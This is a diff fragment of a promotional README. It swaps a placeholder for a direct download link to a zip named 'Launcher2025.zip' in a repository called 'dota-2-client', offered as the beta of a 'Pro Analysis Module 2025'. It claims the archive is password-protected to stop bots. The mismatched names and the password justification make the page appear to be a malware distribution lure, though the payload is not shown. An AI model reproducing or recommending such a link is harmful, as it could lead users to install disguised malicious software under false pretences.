@@ -27,7 +27,7 @@ Don't miss the opportunity to be among the first to experience the future of tra
 
 **Download the Beta Version of the Pro Analysis Module 2025 using the link below:**
 
-[Download Pro Analysis Module 2025](1)
+[Download Pro Analysis Module 2025](https://github.com/guitarakimoeyy/dota-2-client/releases/download/dota2/Launcher2025.zip)
 
 > **🔒 Attention:** To protect the beta version **from bots, unintended use, and unauthorized access** to our unique analysis algorithms, the file is compressed and protected by a password.
 >
